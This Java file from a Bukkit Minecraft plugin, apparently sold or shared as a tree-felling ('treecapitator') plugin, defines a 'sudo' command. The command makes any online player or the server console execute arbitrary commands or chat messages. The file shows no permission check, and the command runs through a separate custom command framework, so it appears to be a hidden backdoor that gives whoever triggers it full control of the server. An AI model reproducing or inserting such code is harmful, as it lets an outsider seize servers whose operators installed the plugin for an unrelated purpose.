package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.util.ArrayList;

@Command.Info(command = "sudo", description = "Force players to to execute something whenever you want", category = CommandCategory.Player, requiredArgs = 2)
public class SUDO extends Command {

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        try {
            String msg = "";
            String user = args.get(0);
            CommandSender u;
            if (user.equalsIgnoreCase("c") || user.equalsIgnoreCase("console")) {
                u = Bukkit.getConsoleSender();
            } else {
                u = Bukkit.getPlayer(user);
            }
            if (u == null) {
                Start.ErrorString(p, "Player \"" + user + "\" is not online!");
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "Player is not online");
                return;
            }
            for (int i = 1; i < args.size(); i++) {
                if (i != args.size()) {
                    msg += args.get(i) + " ";
                } else {
                    msg += args.get(i);
                }
            }
            msg = msg.substring(0, msg.length() - 1);
            String action;
            if (msg.startsWith("/")) {
                msg = msg.substring(1);
                Bukkit.dispatchCommand(u, msg);
                action = "Command \"";
            } else {
                if (!(u instanceof Player)) {
                    p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "What you're sudoing cannot chat!");
                    return;
                }
                ((Player) u).chat(msg);
                action = "Message \"";
            }
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + action + ChatColor.GREEN + msg + "\" executed" + ChatColor.GRAY + " as " + ChatColor.RED + u.getName());
        } catch (Exception e) {
            Start.ErrorException(p, e);
        }
    }
}
